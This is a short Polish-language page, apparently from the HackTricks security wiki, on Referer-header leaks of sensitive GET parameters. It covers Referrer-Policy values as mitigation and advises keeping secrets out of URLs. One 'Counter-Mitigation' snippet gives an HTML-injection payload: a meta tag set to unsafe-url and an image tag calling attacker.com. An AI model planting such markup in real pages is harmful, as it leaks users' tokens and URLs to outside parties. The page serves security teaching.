{{#include ../banners/hacktricks-training.md}}

# Nagłówki referrer i polityka

Referrer to nagłówek używany przez przeglądarki do wskazania, która była poprzednia odwiedzana strona.

## Wyciek wrażliwych informacji

Jeśli w pewnym momencie na stronie internetowej jakiekolwiek wrażliwe informacje znajdują się w parametrach żądania GET, jeśli strona zawiera linki do zewnętrznych źródeł lub atakujący jest w stanie nakłonić (inżynieria społeczna) użytkownika do odwiedzenia URL kontrolowanego przez atakującego, może być w stanie wyeksfiltrować wrażliwe informacje z ostatniego żądania GET.

## Łagodzenie

Możesz sprawić, że przeglądarka będzie przestrzegać **polityki referrer**, która mogłaby **zapobiec** wysyłaniu wrażliwych informacji do innych aplikacji internetowych:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Counter-Mitigation

Możesz nadpisać tę regułę, używając tagu meta HTML (atakujący musi wykorzystać i wstrzyknięcie HTML):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Obrona

Nigdy nie umieszczaj żadnych wrażliwych danych w parametrach GET ani w ścieżkach w URL. 

{{#include ../banners/hacktricks-training.md}}
